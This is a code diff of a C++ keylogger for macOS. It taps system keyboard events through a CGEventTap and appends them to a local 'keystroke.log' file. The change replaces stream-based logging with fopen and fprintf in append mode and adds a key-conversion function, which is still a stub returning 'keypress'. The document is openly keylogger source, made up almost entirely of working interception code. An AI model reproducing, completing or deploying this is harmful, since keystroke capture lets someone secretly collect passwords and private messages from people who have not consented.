@@ -1,5 +1,4 @@
 #include <iostream>
-#include <fstream>
 #include <stdio.h>
 #include <ApplicationServices/ApplicationServices.h>
 #include <Carbon/Carbon.h>
@@ -7,9 +6,9 @@
 
 using namespace std;
 
-const char *logfileLocation = "./keystroke.log";
-fstream logfile;
+FILE *logfile = NULL;
 CGEventRef CGEventCallback (CGEventTapProxy, CGEventType, CGEventRef, void *);
+const char *convertKeyCode(int);
 
 int main(int argc, const char *argv[]) {
 
@@ -26,8 +25,9 @@ int main(int argc, const char *argv[]) {
     CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);
     CGEventTapEnable(eventTap, true);
 
-    logfile.open(logfileLocation, ios::out);
-    logfile << "Keylogging started.\n\n";
+    const char *logfileLocation = "./keystroke.log";
+    logfile = fopen(logfileLocation, "a");
+    fprintf(logfile, "Keylogging has begun.\n\n");
     CFRunLoopRun();
 
     return 0;
@@ -39,6 +39,10 @@ CGEventRef CGEventCallback (CGEventTapProxy proxy, CGEventType type, CGEventRef 
     }
     CGKeyCode keyCode = (CGKeyCode) CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
 
-    logfile << keyCode;
+    fprintf(logfile, "%s", convertKeyCode(keyCode));
     return event;
+}
+
+const char *convertKeyCode(int keyCode) {
+    return "keypress";
 }
